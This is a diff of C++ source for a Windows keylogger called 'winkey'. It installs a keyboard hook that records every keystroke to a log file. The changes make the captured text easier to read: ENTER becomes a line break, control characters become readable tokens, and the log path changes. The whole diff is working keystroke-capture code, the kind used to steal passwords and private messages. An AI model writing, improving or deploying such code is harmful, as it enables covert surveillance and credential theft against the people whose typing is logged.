@@ -11,7 +11,7 @@ TCHAR old_wnd_title[1024] = { 0 };
 
 std::string map_keys[255] = { 
 	"", "LEFT_MOUSE", "RIGHT_MOUSE", "Control-Break", "MIDDLE_MOUSE", "X1_MOUSE", "X2_MOUSE",
-	"", "BACKSPACE", "TAB", "", "", "CLEAR", "--", "", "", "SHIFT", "CTRL", "ALT", "PAUSE",
+	"", "BACKSPACE", "TAB", "", "", "CLEAR", "ENTER", "", "", "SHIFT", "CTRL", "ALT", "PAUSE",
 	"CAPS", "", "", "", "", "", "", "ESC", "", "", "", "", "--", "PAGE_UP", "PAGE_DOWN",
 	"END", "HOME", "LEFT_ARROW", "UP_ARROW", "RIGHT_ARROW", "DOWN_ARROW", "SELECT", "PRINT", "EXECUTE", "PRINT_SCREEN",
 	"INSERT", "DE", "HELP", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "", "", "", "", "", "", "",
@@ -46,7 +46,7 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 		BYTE uKeyboardState[256] = { 0 };
 		SYSTEMTIME local_time;
 
-		std::wofstream log_file(L"C:\\Users\\Public\\winkey.log", std::wofstream::app);
+		std::wofstream log_file(L"winkey.log", std::wofstream::app);
 		log_file.imbue(utf8_locale);
 
 		if (log_file.is_open()) {
@@ -60,9 +60,13 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 			if (strcmp(map_keys[kbd_struct->vkCode].c_str(), "--") != 0 &&
 				strcmp(map_keys[kbd_struct->vkCode].c_str(), "") != 0 &&
 				wParam == WM_KEYDOWN) {
-				char key[32] = { 0 };
-				_snprintf_s(key, 32, 32, "[%s]", map_keys[kbd_struct->vkCode].c_str());
-				log_file << key;
+				if (kbd_struct->vkCode == 13) {
+					log_file << std::endl;
+				} else {
+					char key[32] = { 0 };
+					_snprintf_s(key, 32, 32, "[%s]", map_keys[kbd_struct->vkCode].c_str());
+					log_file << key;
+				}
 			} else {
 				GetKeyState(VK_SHIFT);
 				GetKeyState(VK_MENU);
@@ -70,7 +74,11 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 				WCHAR buffer[8];
 				numChars = ToUnicodeEx(kbd_struct->vkCode, kbd_struct->scanCode, uKeyboardState, buffer, 8, 0, currentLocale);
 				if (numChars == 1) {
-					log_file << buffer;
+					if (buffer[0] >= 1 && buffer[0] <= 29) {
+						log_file << "+[" << (char)(buffer[0] + 64) << "]";
+					} else {
+						log_file << buffer;
+					}
 				}
 			}
 
